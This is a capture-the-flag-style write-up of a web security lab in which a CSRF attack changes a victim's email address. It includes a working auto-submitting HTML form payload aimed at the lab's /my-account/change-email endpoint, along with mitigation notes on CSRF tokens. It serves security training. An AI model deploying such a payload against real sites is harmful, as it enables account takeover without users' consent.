# **Lab: CSRF vulnerability with no defenses (APPRENTICE)** üõ°Ô∏è

## **Mission Description** üß†
The application's email change functionality is highly vulnerable to **Cross-Site Request Forgery (CSRF)** because it implements **no defenses** against this attack.

---

## **Objective** üéØ
Craft an HTML payload using a CSRF attack to change the victim's email address and host it on the Exploit Server.

---

## **Steps to Reproduce and Exploit** ü™ú

1.  **Request Analysis:**
    * Logged in using the provided credentials (`wiener:peter`).
    * Intercepted the legitimate email change request using Burp Suite.
    * The request was a **POST** to `/my-account/change-email` with the body containing only the `email` parameter.

2.  **Identifying Weakness (No Defenses):**
    * The request **did not contain any CSRF Token** or other unpredictable, secret values.
    * The application relies solely on the user's **Session Cookie** for authorization, which enables the CSRF exploit.

3.  **Exploit Code Creation:**
    * Created an HTML form that perfectly mimics the vulnerable POST request, forcing the victim's browser to submit the request to the application's endpoint.

### **Exploit Payload (HTML/JavaScript)**

<form method="POST" action="https://[LAB_ID].web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned-by-attacker@mail.com">
</form>
<script>
    // Auto-submit the form to silently execute the attack when the victim views the page.
    document.forms[0].submit();
</script>

4.  **Execution:**
    * The payload was uploaded to the Exploit Server and delivered to the victim.
    * The victim's browser automatically submits the form, including their valid session cookie, successfully changing their email address and solving the lab.

---

## **Vulnerability & Solution** ‚úÖ
The lab was solved by successfully hosting and delivering the malicious HTML payload, confirming the application's lack of CSRF protection.

---

## **Notes** üìù
* **Vulnerability Type:** CSRF (Classic No-Defenses scenario).
* **Impact:** An attacker can force authenticated users to perform state-changing actions (like changing email) without their consent.
* **Mitigation:** Implement strong **CSRF Tokens** (Synchronizer Token Pattern) in all state-changing POST requests. These tokens must be unique, secret, and tied to the user's session.

